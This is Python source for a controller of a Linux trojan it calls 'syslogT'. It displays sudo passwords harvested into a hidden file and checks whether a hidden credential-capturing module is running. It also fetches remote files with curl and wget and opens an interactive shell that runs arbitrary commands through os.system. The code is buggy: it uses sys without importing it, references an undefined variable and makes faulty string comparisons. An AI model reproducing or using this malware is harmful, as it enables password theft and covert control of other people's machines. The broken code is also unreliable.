import os
import subprocess
import argparse
from sys import argv

def main():
    if(len(sys.argv) != 2):
        print("Usage: syslogb {command}")
    else:
        option = sys.argv[1]
        if(option.lower() in ('xyz')):
            print("abc")
        elif(option.lower() in ('-h', '--help')):
            print("""
            Syslogd, controller for the syslogT trojan.
            
            Commands:
            
            -h, --help   | displays this message and exits.
            
            -s, --status | displays current module status.
            
            -p, --pass   | displays current saved passwords collected by "Sudo"
            
            """)
        elif(option.lower() in ('s', '--status')):
            print("Current status:")
            print()
            if(checkStatus(".brain.py")):
                os.system("echo -e "+"Sudo Brain status: "+"\033[32m[ACTIVE]\033[0m")
            else:
                os.system("echo -e "+"Sudo Brain status: "+"\033[31m[INACTIVE]\033[0m")
        elif(option.lower() in ('p', '--pass')):
            os.system("cat /lib/.syslogbLog | less")
        elif(option.lower() in ('d', '--down')):
            print("Entering Downloader")
            option = input("(F)ile or (D)irectory: ")
            if(option.lower() in ('f')):       
                Fil = input("Enter name of file to place download in: ")
                Dir = input("Enter directory to place file in(proper directory format, no end /): ")
                if(os.path.exists(Dir+"/"+Fil)):
                    option = input("File/Path already exists. Would you like to override? ")
                    if(option.lower() in ('y', 'yes')):   
                        link = input("Enter full url to download from: ")
                        os.system("curl -o "+Dir+"/"+Fil+ " "+link)
                        if(os.path.exists(Dir+"/"+Fil)):
                            print("Successfully Downloaded.")
                        else:
                            print("File not present after download. Possible failure.")
                    else:
                        print("Not overriding. Exiting.")
                else:
                    link = input("Enter full url to download from: ")
                    os.system("curl -o "+Dir+"/"+Fil+ " "+link)
                    if(os.path.exists(Dir+"/"+Fil)):
                        print("Successfully Downloaded.")
                    else:
                        print("File not present after download. Possible failure.")
            elif(option.lower() in ('d')):
                Dir = input("Enter directory to download to(proper directory format): ") 
                link = input("Enter full url to download from: ")
                option = input("Recursion(digs through subdirectories): ")
                if(option.lower() in ('y')):
                    num = input("How much depth(how many levels of subdirectories): ")
                    os.system("mkdir "+Dir)
                    os.system("wget -P "+Dir+ " -r -l "+num+" "+link)
                else:
                    os.system("mkdir "+Dir)
                    os.system("wget -P "+Dir+ " "+link)
        elif(value.lower() in ('c', '--command')):
            print("Entering Command-Line.....(Enter \"exit\" to exit)")
            x = True
            while(x):
                inVal = input("Command@SyslogT# ")
                if(inVal.lower() in ("exit")):
                    x = False
                elif(inVal.lower() in ('h', 'help')):
                    os.system("cat /var/spool/.log.sh")
                elif(inVal.lower() in ("info")):
                    print(os.uname())
                else:
                    os.system(inVal)
def checkStatus(fileName):
    ps_output = subprocess.check_output(["ps", "-ef"])
    ps_lines = ps_output.decode("utf-8").split("\n")
    for line in ps_lines:
        if fileName in line:
            return True
    else:
        return False
main()